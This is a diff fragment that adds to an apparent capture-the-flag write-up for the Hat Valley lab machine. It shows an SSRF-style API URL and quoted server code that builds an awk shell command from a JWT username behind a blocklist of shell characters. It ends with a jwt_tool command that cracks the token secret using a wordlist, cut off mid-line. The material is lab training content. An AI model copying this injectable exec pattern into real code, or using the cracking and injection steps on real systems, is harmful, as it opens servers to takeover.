@@ -148,9 +148,90 @@ ________________________________________________
 :: Progress: [10000/10000] :: Job [1/1] :: 546 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
 ```
 
+After fuzzing we can navigate to the site to see how it's API operates
+
+http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fhat-valley.htb:3002%22
 
 
+Navigate to the /api/all-leave section to see the vulnerable code
 
+
+```js
+app.get('/api/all-leave', (req, res) => {
+
+  const user_token = req.cookies.token
+
+  var authFailed = false
+
+  var user = null
+
+  if(user_token) {
+
+    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
+
+    if(!decodedToken.username) {
+
+      authFailed = true
+
+    }
+
+    else {
+
+      user = decodedToken.username
+
+    }
+
+  }
+
+  if(authFailed) {
+
+    return res.status(401).json({Error: "Invalid Token"})
+
+  }
+
+  if(!user) {
+
+    return res.status(500).send("Invalid user")
+
+  }
+
+  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
+
+
+  const badInUser = bad.some(char => user.includes(char));
+
+
+  if(badInUser) {
+
+    return res.status(500).send("Bad character detected.")
+
+  }
+
+
+  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
+
+    if(stdout) {
+
+      return res.status(200).send(new Buffer(stdout, 'binary'));
+
+    }
+
+    if (error) {
+
+      return res.status(500).send("Failed to retrieve leave requests")
+
+    }
+
+    if (stderr) {
+
+      return res.status(500).send("Failed to retrieve leave requests")
+
+    }
+
+  })
+
+})
+```
 
 ```console
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -d /usr/share/wordlists/rockyou.txt -C 
